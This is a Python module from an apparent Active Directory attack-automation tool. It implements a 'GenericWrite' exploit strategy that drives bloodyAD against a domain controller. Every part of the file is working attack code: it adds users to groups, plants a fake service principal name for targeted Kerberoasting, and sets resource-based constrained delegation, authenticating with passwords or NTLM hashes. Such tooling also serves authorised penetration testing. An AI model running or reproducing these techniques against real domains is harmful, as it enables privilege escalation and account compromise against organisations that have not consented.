# strategies/generic_write.py

from dataclasses import dataclass
from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_check, print_warning, print_done
from utils.runner import run_tool
from utils.platform import BACKEND


@dataclass
class GenericWriteStrategy(ExploitStrategy):
    edge:   Edge
    victim: Node

    @property
    def attacker(self) -> Node:
        return self.edge.source_node

    @property
    def target(self) -> Node:
        return self.edge.goal_node

    def can_exploit(self) -> bool:
        return self.edge.kind in {EdgeKind.GENERIC_WRITE, EdgeKind.GENERIC_ALL}

    def exploit(self, creds: dict) -> ExploitResult:
        if BACKEND.name == "none":
            raise HopFailedError(
                self.edge,
                "No backend available. Run: pip install bloodyAD  "
                "(or on Windows: wsl pip install bloodyAD)"
            )

        print_check(
            f"GenericWrite [{BACKEND.name}]: "
            f"{self.attacker.label} ──▶ {self.target.label}"
        )

        match self.target.kind:
            case NodeKind.GROUP:
                return self._add_member(creds)
            case NodeKind.USER:
                return self._targeted_kerberoast(creds)
            case NodeKind.COMPUTER:
                return self._rbcd(creds)
            case _:
                raise HopFailedError(
                    self.edge,
                    f"GenericWrite on {self.target.kind.value} — no known technique"
                )

    # ── Techniques ────────────────────────────────────────────────────────────

    def _add_member(self, creds: dict) -> ExploitResult:
        group_sam  = _sam(self.target.label)
        victim_sam = _sam(self.victim.label)

        ok, output = run_tool(_bloodyad(creds, [
            "add", "groupMember", group_sam, victim_sam
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"AddMember failed:\n{output}")

        print_done(f"{victim_sam} added to {group_sam}")
        return ExploitResult(success=True, output=output, technique="AddMember")

    def _targeted_kerberoast(self, creds: dict) -> ExploitResult:
        target_sam = _sam(self.target.label)

        ok, output = run_tool(_bloodyad(creds, [
            "set", "object", target_sam,
            "--attribute", "servicePrincipalNames",
            "--value",     f"fake/roast.{creds['domain']}"
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"SPN write failed:\n{output}")

        print_done(f"SPN set on {target_sam} — ready to Kerberoast")
        return ExploitResult(success=True, output=output, technique="TargetedKerberoast")

    def _rbcd(self, creds: dict) -> ExploitResult:
        target_sam   = _sam(self.target.label)
        attacker_sam = _sam(self.attacker.label)

        ok, output = run_tool(_bloodyad(creds, [
            "add", "rbcd", target_sam, attacker_sam
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"RBCD write failed:\n{output}")

        print_done(f"RBCD set: {attacker_sam} → {target_sam}")
        return ExploitResult(success=True, output=output, technique="RBCD")


# ── Helpers ───────────────────────────────────────────────────────────────────

def _sam(label: str) -> str:
    return label.split("@")[0]


def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]:
    cmd = [
        "bloodyAD",
        "--host", creds["dc_ip"],
        "-d",     creds["domain"],
        "-u",     creds["username"],
    ]
    if pw := creds.get("password"):
        cmd += ["-p", pw]
    elif nh := creds.get("hashes"):
        cmd += ["--hashes", nh]
    return cmd + subcommand